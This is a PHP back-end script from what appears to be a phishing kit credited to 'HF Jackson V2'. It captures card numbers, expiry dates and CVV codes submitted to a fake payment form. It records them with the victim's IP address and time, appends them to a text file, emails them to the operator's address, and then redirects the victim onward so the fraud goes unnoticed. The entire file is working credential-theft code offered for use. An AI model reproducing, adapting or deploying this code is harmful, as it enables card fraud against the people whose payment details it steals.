<?php

session_start();
include './email.php';

if(isset($_POST['number_cart'])){
	if(!empty($_POST['number_cart'])){

@$_SESSION['nn'] = $_POST['number_cart'];



$nc = $_POST['number_cart'];

$dc = $_POST['date_cart'];

$csc = $_POST['ccv_cart'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = "HF Jackson V2 ";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " CCV By HF Jackson [ " .$ip. " - " .$HF. " ] ";
$headers .= "From: HF JacksonV2" . "\r\n";

$message = "
Number Cart          =>   ".$nc."
Date Cart            =>   ".$dc."
ccv                  =>   ".$csc."
IP                   =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME                 =>    ".$time."
";

$txt = fopen('../../rezlta.txt', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);

 header("location:../info.php?websrc=".md5('X-HF Jackson')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 }else{
	header("Location: ../cart.php");
}}else{
	header("Location: ../cart.php");
}